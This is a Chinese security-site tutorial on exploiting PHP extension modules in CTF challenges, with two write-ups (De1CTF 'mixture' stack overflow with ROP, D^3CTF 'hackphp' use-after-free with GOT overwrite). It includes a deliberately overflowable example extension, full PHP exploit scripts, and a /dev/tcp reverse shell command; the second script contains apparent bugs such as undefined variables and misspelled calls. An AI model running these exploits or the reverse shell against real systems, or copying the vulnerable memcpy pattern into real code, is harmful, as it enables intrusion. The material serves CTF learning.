# WebPwn：php-pwn学习

阅读量 **364012**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-04-08 16:30:07

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t0187a0123720add4a1.png)

>
> 现在的CTF比赛，WebPwn题目越来越常见，本篇文章目标为WebPwn入门学习。将会介绍Webpwn环境搭建，以及分别以一道栈溢出题目和一道堆题，讲解Webpwn的入门知识点。

## php-pwn拓展模块

现有Webpwn题目通常为php-pwn，主要考察对php拓展模块漏洞的利用技巧。所以，题目一般会给一个php的.so文件，该文件是需要重点分析的二进制文件。其次，可能会给一个Dockerfile用于搭建php-pwn的环境。  
首先，需要安装一个本地php环境，使用如下命令：

    
    
    sudo apt install php php-dev
    

然后，需要下载对应版本的php源码，可在[此处下载](https://github.com/php/php-src/releases)。

在源码目录中，重点关注ext目录，该目录
包含了`php`拓展库代码。如果想编译一个自己的拓展模块，需要在该目录下进行，在该目录下使用如下命令，既可以创建一个属于自己的拓展模块工程文件：

    
    
    ./ext_skel --extname=phppwn
    

此时，在 `ext`目录下，即会生成一个 `phppwn`的文件夹。进入该文件夹，可以看到如下文件：

    
    
    config.m4  config.w32  CREDITS  EXPERIMENTAL  php_phppwn.h  phppwn.c  phppwn.php  tests
    

只需要重点 `phppwn.c`文件，该文件初始代码如下：

    
    
    /*
      +----------------------------------------------------------------------+
      | PHP Version 7                                                        |
      +----------------------------------------------------------------------+
      | Copyright (c) 1997-2018 The PHP Group                                |
      +----------------------------------------------------------------------+
      | This source file is subject to version 3.01 of the PHP license,      |
      | that is bundled with this package in the file LICENSE, and is        |
      | available through the world-wide-web at the following url:           |
      | http://www.php.net/license/3_01.txt                                  |
      | If you did not receive a copy of the PHP license and are unable to   |
      | obtain it through the world-wide-web, please send a note to          |
      | license@php.net so we can mail you a copy immediately.               |
      +----------------------------------------------------------------------+
      | Author:                                                              |
      +----------------------------------------------------------------------+
    */
    
    /* $Id$ */
    
    #ifdef HAVE_CONFIG_H
    #include "config.h"
    #endif
    
    #include "php.h"
    #include "php_ini.h"
    #include "ext/standard/info.h"
    #include "php_phppwn.h"
    
    /* If you declare any globals in php_phppwn.h uncomment this:
    ZEND_DECLARE_MODULE_GLOBALS(phppwn)
    */
    
    /* True global resources - no need for thread safety here */
    static int le_phppwn;
    
    /* {{{ PHP_INI
     */
    /* Remove comments and fill if you need to have entries in php.ini
    PHP_INI_BEGIN()
        STD_PHP_INI_ENTRY("phppwn.global_value",      "42", PHP_INI_ALL, OnUpdateLong, global_value, zend_phppwn_globals, phppwn_globals)
        STD_PHP_INI_ENTRY("phppwn.global_string", "foobar", PHP_INI_ALL, OnUpdateString, global_string, zend_phppwn_globals, phppwn_globals)
    PHP_INI_END()
    */
    /* }}} */
    
    /* Remove the following function when you have successfully modified config.m4
       so that your module can be compiled into PHP, it exists only for testing
       purposes. */
    
    /* Every user-visible function in PHP should document itself in the source */
    /* {{{ proto string confirm_phppwn_compiled(string arg)
       Return a string to confirm that the module is compiled in */
    PHP_FUNCTION(confirm_phppwn_compiled)
    {
        char *arg = NULL;
        size_t arg_len, len;
        zend_string *strg;
    
        if (zend_parse_parameters(ZEND_NUM_ARGS(), "s", &arg, &arg_len) == FAILURE) {
            return;
        }
    
        strg = strpprintf(0, "Congratulations! You have successfully modified ext/%.78s/config.m4. Module %.78s is now compiled into PHP.", "phppwn", arg);
    
        RETURN_STR(strg);
    }
    /* }}} */
    /* The previous line is meant for vim and emacs, so it can correctly fold and
       unfold functions in source code. See the corresponding marks just before
       function definition, where the functions purpose is also documented. Please
       follow this convention for the convenience of others editing your code.
    */
    
    
    /* {{{ php_phppwn_init_globals
     */
    /* Uncomment this function if you have INI entries
    static void php_phppwn_init_globals(zend_phppwn_globals *phppwn_globals)
    {
        phppwn_globals->global_value = 0;
        phppwn_globals->global_string = NULL;
    }
    */
    /* }}} */
    
    /* {{{ PHP_MINIT_FUNCTION
     */
    PHP_MINIT_FUNCTION(phppwn)
    {
        /* If you have INI entries, uncomment these lines
        REGISTER_INI_ENTRIES();
        */
        return SUCCESS;
    }
    /* }}} */
    
    /* {{{ PHP_MSHUTDOWN_FUNCTION
     */
    PHP_MSHUTDOWN_FUNCTION(phppwn)
    {
        /* uncomment this line if you have INI entries
        UNREGISTER_INI_ENTRIES();
        */
        return SUCCESS;
    }
    /* }}} */
    
    /* Remove if there's nothing to do at request start */
    /* {{{ PHP_RINIT_FUNCTION
     */
    PHP_RINIT_FUNCTION(phppwn)
    {
    #if defined(COMPILE_DL_PHPPWN) && defined(ZTS)
        ZEND_TSRMLS_CACHE_UPDATE();
    #endif
        return SUCCESS;
    }
    /* }}} */
    
    /* Remove if there's nothing to do at request end */
    /* {{{ PHP_RSHUTDOWN_FUNCTION
     */
    PHP_RSHUTDOWN_FUNCTION(phppwn)
    {
        return SUCCESS;
    }
    /* }}} */
    
    /* {{{ PHP_MINFO_FUNCTION
     */
    PHP_MINFO_FUNCTION(phppwn)
    {
        php_info_print_table_start();
        php_info_print_table_header(2, "phppwn support", "enabled");
        php_info_print_table_end();
    
        /* Remove comments if you have entries in php.ini
        DISPLAY_INI_ENTRIES();
        */
    }
    /* }}} */
    
    /* {{{ phppwn_functions[]
     *
     * Every user visible function must have an entry in phppwn_functions[].
     */
    const zend_function_entry phppwn_functions[] = {
        PHP_FE(confirm_phppwn_compiled,    NULL)        /* For testing, remove later. */
        PHP_FE_END    /* Must be the last line in phppwn_functions[] */
    };
    /* }}} */
    
    /* {{{ phppwn_module_entry
     */
    zend_module_entry phppwn_module_entry = {
        STANDARD_MODULE_HEADER,
        "phppwn",
        phppwn_functions,
        PHP_MINIT(phppwn),
        PHP_MSHUTDOWN(phppwn),
        PHP_RINIT(phppwn),        /* Replace with NULL if there's nothing to do at request start */
        PHP_RSHUTDOWN(phppwn),    /* Replace with NULL if there's nothing to do at request end */
        PHP_MINFO(phppwn),
        PHP_PHPPWN_VERSION,
        STANDARD_MODULE_PROPERTIES
    };
    /* }}} */
    
    #ifdef COMPILE_DL_PHPPWN
    #ifdef ZTS
    ZEND_TSRMLS_CACHE_DEFINE()
    #endif
    ZEND_GET_MODULE(phppwn)
    #endif
    
    /*
     * Local variables:
     * tab-width: 4
     * c-basic-offset: 4
     * End:
     * vim600: noet sw=4 ts=4 fdm=marker
     * vim<600: noet sw=4 ts=4
     */
    

我们只需要在该模板代码中，加上属于我们自己的函数，以及为函数进行注册，即可完成编写一个拓展模块。

如果要添加自己的函数，可以按如下模板编写：

    
    
    PHP_FUNCTION(easy_phppwn)
    {
        char *arg = NULL;
        size_t arg_len, len;
        char buf[100];
        if(zend_parse_parameters(ZEND_NUM_ARGS(), "s", &arg, &arg_len) == FAILURE){
            return;
        }
        memcpy(buf, arg, arg_len);
        php_printf("phppwn extension function\n");
        return SUCCESS;
    }
    

其中 `PHP_FUNCTION`修饰的函数表示该函数可以直接在php中进行调用。而
`zend_parse_parameters`函数是获取用户输入的参数。arg代表参数字符，arg_len代表参数长度。

然后，需要在 `zend_function_entry phppwn_functions` 中对该函数进行注册：

    
    
    const zend_function_entry phppwn_functions[] = {
        PHP_FE(confirm_phppwn_compiled,    NULL)        /* For testing, remove later. */
        PHP_FE(phppwn, NULL)
        PHP_FE_END    /* Must be the last line in phppwn_functions[] */
    };
    

随后，即可使用如下命令配置编译：

    
    
    /usr/bin/phpize
    ./configure --with-php-config=/usr/bin/php-config
    

随后，可以使用 make指令编译生成拓展模块。新生成的拓展模块会被放在同目录下 `./modules`中。也可以直接使用 `make
install`命令。然后将新生成的拓展模块放置到 本地 `php`所在的拓展库路径下。可以使用如下命令，查找本地php拓展库路径：

    
    
    php -i | grep extensions
    

然后，在`php.ini`文件里添加自行编写的拓展库名称即可，直接在文件末尾添加如下代码：

    
    
    extensions=phppwn.so
    

自此，我们即可在 php中直接调用之前在拓展模块中注册的 phppwn()函数。  
 **调试技巧**  
一般使用 IDA查看拓展库 `.so`文件，需要重点关注由拓展库自己注册的函数，名字一般由 zif开头。我们需要重点关注此类函数即可。

如果使用gdb调试，可以直接调试本地环境的 `php`程序，使用如下命令：

    
    
    gdb php
    

随后，`r`运行，ctrl+b中断，然后即可对拓展库下函数名断点。

> 下面以2到例题，讲解webpwn的做题思路。

## 2020De1CTF-mixture

###  环境搭建

这里原题目是需要通过结合了一系列web漏洞，最后才能拿到
`php`的拓展模块。此处对前面`web`漏洞不做分析，重点分析后续的`php`漏洞利用。所以，直接用题目所给的 `.so`来搭建环境。

将`Minclude.so`放入本地 `php`拓展库路径下，随后在 `php.ini`配置文件中，添加如下代码：

    
    
    extensions=Minclude.so
    

随后创建如下文件，测试拓展模块是否加载成功：

    
    
    <?php
        phpinfo();
    ?>
    

执行命令，得到如下结果说明环境搭建成功。

    
    
    $php test.php | grep Minclude
    Minclude
    Minclude support => enabled
    

###  漏洞分析

这里 `Minclude.so`使用了花指令进行了混淆，可以看到无法对 zif_Minclude直接生成伪代码。这里需要先做一个去除花指令：

    
    
    .text:0000000000001220 zif_Minclude    proc near               ; DATA XREF: LOAD:0000000000000418↑o
    .text:0000000000001220                                         ; .data.rel.ro:Minclude_functions↓o
    .text:0000000000001220
    .text:0000000000001220 arg             = qword ptr -98h
    .text:0000000000001220 arg_len         = qword ptr -90h
    .text:0000000000001220 a               = byte ptr -88h
    .text:0000000000001220
    .text:0000000000001220 ; FUNCTION CHUNK AT .text:0000000000001236 SIZE 0000000F BYTES
    .text:0000000000001220
    .text:0000000000001220 execute_data = rdi                      ; zend_execute_data *
    .text:0000000000001220 return_value = rsi                      ; zval *
    .text:0000000000001220 ; __unwind {
    .text:0000000000001220                 push    r12
    .text:0000000000001222                 mov     r8, execute_data
    .text:0000000000001225                 mov     r12, return_value
    .text:0000000000001228                 push    rbp
    .text:0000000000001229                 push    rbx
    .text:000000000000122A                 add     rsp, 0FFFFFFFFFFFFFF80h
    .text:000000000000122E                 push    rax
    .text:000000000000122F                 xor     rax, rax
    .text:0000000000001232                 jz      short next1
    .text:0000000000001232 zif_Minclude    endp ; sp-analysis failed
    .text:0000000000001232
    .text:0000000000001232 ; ---------------------------------------------------------------------------    .text:0000000000001234                 db 0E9h, 0DEh
    .text:0000000000001236 ; ---------------------------------------------------------------------------    .text:0000000000001236 ; START OF FUNCTION CHUNK FOR zif_Minclude
    .text:0000000000001236
    .text:0000000000001236 next1:                                  ; CODE XREF: zif_Minclude+12↑j
    .text:0000000000001236                 pop     rax
    .text:0000000000001237                 mov     [rsp+98h+arg], 0
    .text:000000000000123F                 push    rax
    .text:0000000000001240                 call    l2
    .text:0000000000001240 ; END OF FUNCTION CHUNK FOR zif_Minclude
    .text:0000000000001240 ; ---------------------------------------------------------------------------    .text:0000000000001245                 db 0EAh
    .text:0000000000001246
    .text:0000000000001246 ; =============== S U B R O U T I N E =======================================
    .text:0000000000001246
    .text:0000000000001246
    .text:0000000000001246 l2              proc near               ; CODE XREF: zif_Minclude+20↑p
    .text:0000000000001246                 pop     rax
    .text:0000000000001247                 add     rax, 8
    .text:000000000000124B                 push    rax
    .text:000000000000124C                 retn
    .text:000000000000124C l2              endp
    .text:000000000000124C
    

这里 0x122e 到 0x124d为无效指令，可以直接对其
nop掉，具体原理方法，可参考[这篇文章](https://aluvion.gitee.io/2020/06/29/%E9%80%86%E5%90%91%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%85%A5%E9%97%A8/)。  
然后，即可正常生成反汇编代码：

    
    
    void __fastcall zif_Minclude(zend_execute_data *execute_data, zval *return_value)
    {
      zval *v2; // r12
      unsigned __int64 v3; // rsi
      FILE *v4; // rbx
      __int64 v5; // rax
      void *src; // [rsp+0h] [rbp-98h]
      size_t n; // [rsp+8h] [rbp-90h]
      char dest; // [rsp+10h] [rbp-88h]
      int v9; // [rsp+70h] [rbp-28h]
      char *v10; // [rsp+74h] [rbp-24h]
      v2 = return_value;
      memset(&dest, 0, 0x60uLL);
      v9 = 0;
      v10 = &dest;
      if ( (unsigned int)zend_parse_parameters(execute_data->This.u2.next, "s", &src, &n) != -1 )
      {
        memcpy(&dest, src, n);
        php_printf("%s", &dest);
        php_printf("<br>", &dest);
        v3 = (unsigned __int64)"rb";
        v4 = fopen(&dest, "rb");
        if ( v4 )
        {
          while ( !feof(v4) )
          {
            v3 = (unsigned int)fgetc(v4);
            php_printf("%c", v3);
          }
          php_printf("\n", v3);
        }
        else
        {
          php_printf("no file\n", "rb");
        }
        v5 = zend_strpprintf(0LL, "True");
        v2->value.lval = v5;
        v2->u1.type_info = (*(_BYTE *)(v5 + 5) & 2u) < 1 ? 5126 : 6;
      }
    }
    

这里存在一个简单的栈溢出漏洞。`memcpy`函数的源地址为`rbp-0x88`，而
`src`是由我们自己输入的参数字符串，`n`是参数字符串的长度。也即，这里可以栈溢出，我们的初步思路为执行`ROP`。

后续功能是可以读取系统的文件，并将文件内容输出。

###  利用分析

####  泄露地址

执行 `ROP`，我们首先需要知道 `libc`地址和 栈地址。那么如何泄露地址呢？这里需要用到一个 Linux的知识。

`Linux`系统内核提供了一种通过 `/proc`的文件系统，在程序运行时访问内核数据，改变内核设置的机制。
`/proc`是一种伪文件结构，也就是说是仅存在于内存中。`/proc`中一般比较重要的目录是 sys、net和
scsi，sys目录是可写的，可以通过它来访问和修改内核的参数/proc中有一些以 PID命名（进程号）的进程目录，可以读取对应进程的信息，另外还有一个
`/sel`f目录，用于记录本进程的信息。也即可以通过 /proc/$PID/目录来获得该进程的信息，但是这个方法需要知道进程的PID是多少，在
fork、daemon等情况下，PID可能还会发生变化。所以 Linux提供了
self目录，来解决这个问题，不过不同的进程来访问这个目录获得的信息是不同的，内容等价于 /proc/本进程 PID目录下的内容。所以可以通过
self目录直接获得自身的信息，不需要知道 PID。

那么，我们这里只需要读取`/proc/self/maps`文件即可。然后，在输出中得到 libc地址和 栈地址。

这里，还需要用到 `php`的一个技巧，即 ob函数。在`php`中我们可以通过
`ob_start`来打开缓冲区，然后程序的输出流就会被存储到变量中，我们可以使用 `ob_get_contents`来获得 输出流，然后通过
正则匹配从输出流中获得 地址。

####  getshell

获得地址后，接下来就是`getshell`。但是如果使用 传统的 `system("/bin/sh\x00")`， php是不能直接获得可交互的
shell。这里，我们需要使用反弹shell的方法，将 shell从漏洞机反弹到我们的攻击机。这里关于反弹shell的原理，可以参考如下文章：  
[Linux反弹shell（二）反弹shell的本质](https://xz.aliyun.com/t/2549)  
这里，我们需要执行的函数如下：

    
    
    poepn('/bin/bash -c "/bin/bash -i >&/dev/tcp/127.0.0.1/666 0>&1"','r')
    

那么，我们总体的ROP结构如下：

    
    
    ROP = flat([
        p_rdi_r, command_addr,
        p_rsi_r, r_addr,
        popen_addr,
        r_flag,
        command
    ])
    

最终的EXP如下所示：

    
    
    <?php
    $libc = "";
    $stack = "";
    function s2i($s) {
        $result = 0;
        for ($x = 0;$x < strlen($s);$x++) {
            $result <<= 8;
            $result |= ord($s[$x]);
        }
        return $result;
    }
    
    function i2s($i, $x = 8) {
        $re = "";
        for($j = 0;$j < $x;$j++) {
            $re .= chr($i & 0xff);
            $i >>= 8;
        }
        return $re;
    }
    
    function callback($buffer){
        global $libc,$stack;
        $p1 = '/([0-9a-f]+)\-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2.27.so/';
        $p = '/([0-9a-f]+)\-[0-9a-f]+ .*  \[stack\]/';
        preg_match_all($p, $buffer, $stack);
        preg_match_all($p1, $buffer, $libc);
        return "";
    }
    $command = '/bin/bash -c "/bin/bash -i >&/dev/tcp/127.0.0.1/6666 0>&1"';
    ob_start("callback");
    $a="/proc/self/maps";
    Minclude($a);
    $buffer=ob_get_contents();
    ob_end_flush();
    callback($buffer);
    $stack = hexdec($stack[1][0]);
    $libc_base = hexdec($libc[1][0]);
    
    $payload=str_repeat("a",0x88);
    $payload.=i2s($libc_base+0x215bf);
    $payload.=i2s($stack+0x1ca98+0x90).i2s($libc_base+0x23eea);
    $payload.=i2s($stack+0x1ca98+0x28).i2s($libc_base+0x80a10);
    $payload.="r".str_repeat("\x00",0x7).str_repeat("c",0x60);
    $payload.=$command.str_repeat("b",0x8);
    echo $payload;
    Minclude($payload)
    ?>
    

## 2021-D^3CTF-hackphp

###  漏洞分析

这道题就是一道纯的 `php-pwn`，并且涉及到了 php堆里的知识。

    
    
    void __fastcall zif_hackphp_create(zend_execute_data *execute_data, zval *return_value)
    {
      __int64 v2; // rdi
      __int64 size[3]; // [rsp+0h] [rbp-18h] BYREF
    
      v2 = execute_data->This.u2.next;
      size[1] = __readfsqword(0x28u);
      if ( (unsigned int)zend_parse_parameters(v2, &unk_2000, size) != -1 )
      {
        buf = (char *)_emalloc(size[0]);
        buf_size = size[0];
        if ( buf )
        {
          if ( (unsigned __int64)(size[0] - 0x100) <= 0x100 )
          {
            return_value->u1.type_info = 3;
            return;
          }
          _efree();
        }
      }
      return_value->u1.type_info = 2;
    }
    

在 `zif_hack_php`函数中，当申请的堆块大小 0<=size<256或者size>512时，程序会将申请的 堆块 buf 使用
_efree释放掉。但是却没有将 buf 堆块指针清空为0。所以这里存在一个 UAF漏洞。

    
    
      unsigned int v5; // eax
      __int64 v6; // rax
      size_t v7; // rdx
      int v8; // er8
      __int64 v9[5]; // [rsp+0h] [rbp-28h] BYREF
    
      v9[1] = __readfsqword(0x28u);
      v5 = *(_DWORD *)(a1 + 44);
      if ( v5 > 1 )
      {
        zend_wrong_parameters_count_error(0LL, 1LL);
      }
      else
      {
        if ( v5 )
        {
          if ( *(_BYTE *)(a1 + 88) == 6 )
          {
            v6 = *(_QWORD *)(a1 + 80);
          }
          else
          {
            v8 = zend_parse_arg_str_slow(a1 + 80, v9);
            v6 = v9[0];
            if ( !v8 )
            {
              zif_hackphp_edit_cold();
              return;
            }
          }
          a4 = *(_QWORD *)(v6 + 16);
          a5 = (const void *)(v6 + 24);
        }
        if ( buf && (v7 = buf_size) != 0 )
        {
          if ( buf_size > a4 )
            v7 = a4;
          memcpy(buf, a5, v7);
          *(_DWORD *)(a2 + 8) = 3;
        }
        else
        {
          *(_DWORD *)(a2 + 8) = 2;
        }
      }
    }
    

在 `zif_hackphp_edit`函数中，可以直接使用 `memcpy`对堆数据进行修改。

    
    
    void __fastcall zif_hackphp_delete(zend_execute_data *execute_data, zval *return_value)
    {
      if ( buf )
      {
        _efree();
        buf = 0LL;
        return_value->u1.type_info = 3;
        buf_size = 0LL;
      }
      else
      {
        return_value->u1.type_info = 2;
      }
    }
    

`zif_hackphp_delete`函数，可以使用 `_efree`释放堆指针。

还有就是 `hackphp.so`的保护机制如下，对 got表的保护为开启，可以直接修改 got表来getshell。

    
    
    checksec hackphp.so                          
    ] '/hackphp.so'     
      Arch:     amd64-64-little                  
      RELRO:    Partial RELRO                    
      Stack:    Canary found                     
      NX:       NX enabled                       
      PIE:      PIE enabled
    

###  利用分析

我们的初步思路，就是利用 UAF漏洞来修改 `_efree[@Got](https://github.com/Got
"@Got")`为`system`，然后在堆块里写入 /readflag，释放该堆块，即可执行 `system('/readflag')`。

####  PHP 堆机制

`PHP`的堆机制与
`ptmalloc`并不相似，`PHP`的内存分配是一次性向系统申请开辟的，`PHP`自身有个内存管理池，每次申请内存都会先在管理池中寻找合适的内存块，找不到才向系统申请内存。并且释放后的内存不交回给系统，而是放在内存管理池中继续使用。其管理机制，与
`Kernel`中的`slab/slub`分配器类似，分配的堆结构并没有堆头，而是与 内存桶对齐。

`PHP`的空闲堆块，有一个 `fd`指针指向下一个相同大小的堆块。并且，这里对该指针并没有做过多检查，我们可以理解为 `2.27下的
tcache`，可以直接使用 `tcache poisonin`g攻击，将`fd`指向任意地址，实现分配堆块到任意地址。

此外，还得讲一下后面会用到的`str_repea`t对象，该对象也会向`php`申请堆内存。当创建一个`str_repeat("a",0x30)`对象时，系统会返回
`0x50`的堆块空间，并且返回堆块偏移 `0x18`地址处 存储的是 字符串的大小，后面才是 字符内容。如下所示：

    
    
    pwndbg> x/20xg 0x00007ffff5871000                         
    0x7ffff5871000: 0x0000000600000001      0x0000000000000000
    0x7ffff5871010: 0x00000000000001f0      0x6161616161616161
    0x7ffff5871020: 0x6161616161616161      0x6161616161616161
    0x7ffff5871030: 0x6161616161616161      0x6161616161616161
    0x7ffff5871040: 0x6161616161616161      0x6161616161616161
    0x7ffff5871050: 0x6161616161616161      0x6161616161616161
    0x7ffff5871060: 0x6161616161616161      0x6161616161616161
    0x7ffff5871070: 0x6161616161616161      0x6161616161616161
    0x7ffff5871080: 0x6161616161616161      0x6161616161616161
    0x7ffff5871090: 0x6161616161616161      0x6161616161616161
    

####  UAF利用

这里，我们先申请一个 `0x210`的堆块，造成 `UAF`漏洞。随后，调用 `edit`函数，修改 `0x210`这个空闲堆块的
fd指向`buf-0x28`的地址。

随后我们创建两个 str_repeat对象，如下：

    
    
    str_repeat("a",0x1f0);
    str_repeat($efree_got, 0x1f0/8)
    

此时，我们即已经将 `buf`的值 修改为 `efree_got`地址。

解释一下原理。当我们完成`edit`后，此时 `0x210`的堆块空闲链表如下，`freed_chun`k为我们首先释放的 0x210堆块

    
    
    freed_chunk->buf-0x28
    

然后，创建第一个 str_repeat对象时，申请了 0x1f0的空间，系统实际会返回 0x210的空间。所以这里 freed_chunk被分配。

创建第二个 str_repear对象时，又申请了 0x1f0的空间，那么 buf-0x28的地址被返回，并且 buf-0x28+0x18处开始填充为
字符内容，也即 efree_got的地址。

那么自此，我们完成了 buf的劫持。

####  getshell

随后，我们使用 `edit`函数，将 `efree_got`修改为 `system`地址。

再调用`create`函数，申请一个 `0x100`的空间，`edit`其内容为 `/readflag`。再调用 delete函数，即可得到flag。

`EXP`如下：

    
    
    <?php
    $libc="";
    $mbase="";
    function str2Hex($str) {
        $hex = "";
        for ($i = strlen($str) - 1;$i >= 0;$i--) $hex.= dechex(ord($str[$i]));
        $hex = strtoupper($hex);
        return $hex;
    }
    
    function int2Str($i, $x = 8) {
        $re = "";
        for($j = 0;$j < $x;$j++) {
            $re .= chr($i & 0xff);
            $i >>= 8;
        }
        return $re;
    }
    
    function leakaddr($buffer){
        global $libc,$mbase;
        $p = '/([0-9a-f]+)\-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2.31.so/';
        $p1 = '/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/lib\/php\/20170718\/hackphp.so/';
        preg_match_all($p, $buffer, $libc);
        preg_match_all($p1, $buffer, $mbase);
        return "";
    }
    
    ob_start("leakaddr");
    include("/proc/self/maps");
    $buffer = ob_get_contents();
    ob_end_flush();
    leakaddr($buffer);
    $libc_base=hexdec($libc[1][0]);
    $mod_base=hexdec($libc[1][0]);
    
    hackphp_create(0x210);
    $data=int2Str($base + 0x4178-0x28);
    hackphp_edit($data);
    
    $heap1=str_repeat("a",0x1f0);
    $heap1=str_repeat(int2Str($mod_base+0x4070),(0x1f0)/8);
    
    hackphp_edit(int2Str($libc_base+0x55410));
    hackphp_create(0x100);
    heackphp_edit("/readflag");
    hackphp_delete();
    ?>
    

###  参考

[WEBPWN入门级调试讲解](https://www.anquanke.com/post/id/204404)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Aone** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/235237](/post/id/235237)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __6赞

 __收藏

![](https://p2.ssl.qhimg.com/t010b42f3d8958ad2d2.png) Aone

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

